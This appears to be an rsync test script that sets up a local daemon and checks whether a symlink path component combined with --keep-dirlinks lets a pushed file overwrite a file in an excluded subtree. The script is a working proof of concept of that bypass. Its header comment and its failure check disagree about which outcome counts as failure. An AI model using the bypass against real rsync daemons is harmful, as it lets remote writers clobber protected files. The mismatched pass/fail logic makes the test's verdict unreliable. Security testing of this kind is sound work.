#!/usr/bin/env python3
# Daemon module-exclude bypass via an in-DESTINATION symlink that appears as a
# PATH COMPONENT of a transferred file (not as the destination argument).
# (Probe for the broader variant of the symlink-exclude finding.)
#
# The module excludes a subtree (exclude = /secret/) and already contains an
# in-module, euid-owned symlink  blink -> secret/  plus a protected victim
# secret/x.  A peer pushes a tree whose file list contains the path "blink/x".
# With --keep-dirlinks the receiver treats the existing dest symlink "blink" as
# the directory it points at and writes THROUGH it, so "blink/x" lands in the
# excluded secret/x -- the per-file daemon filter only ever sees the logical
# name "blink/x", never the physical "secret/x".
#
# RED here = the bypass reproduces (the broader, file-list-component variant is
# exploitable). GREEN = rsync refuses it (e.g. replaces the symlink, or the
# resolver's exclude check catches the physical target).  Runs unprivileged.
import os
import subprocess

from rsyncfns import (
    SCRATCHDIR, rmtree, rsync_argv, start_test_daemon, test_fail, write_daemon_conf,
)

DAEMON_PORT = 12978
SECRET = "PROTECTED-IN-EXCLUDED-SUBTREE\n"

base = SCRATCHDIR / 'symlink-exclude-component'
rmtree(base)
base.mkdir()

mod = base / 'mod'
mod.mkdir()
secret = mod / 'secret'                       # excluded subtree
secret.mkdir()
victim = secret / 'x'
victim.write_text(SECRET)                      # must not be clobbered

blink = mod / 'blink'                          # in-module symlink -> excluded dir
os.symlink('secret/', blink)

src = base / 'src'
(src / 'blink').mkdir(parents=True)            # file list will contain blink/ + blink/x
(src / 'blink' / 'x').write_text("NEW\n")

conf = write_daemon_conf(
    [('mod', {'path': str(mod), 'read only': 'no', 'exclude': '/secret/'})])
url = start_test_daemon(conf, DAEMON_PORT)

# --keep-dirlinks: treat the dest symlink "blink" as the dir it points at.
subprocess.run(
    rsync_argv('-a', '--keep-dirlinks', f'{src}/', f'{url}mod/'),
    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

after = victim.read_text() if victim.exists() else None
if after == SECRET:
    test_fail(
        "the daemon refused a transferred path through an in-dest symlink that "
        f"stock rsync (3.2.7) follows: {victim} is still {after!r}.  The daemon "
        "filter is name-based (it sees the logical 'blink/x', not 'secret/x'); it "
        "must not block this -- `munge symlinks` defends a writable module.")
print("daemon exclude is name-based: a transferred path through an in-dest symlink "
      "lands in the excluded subtree (3.2.7-equivalent)")
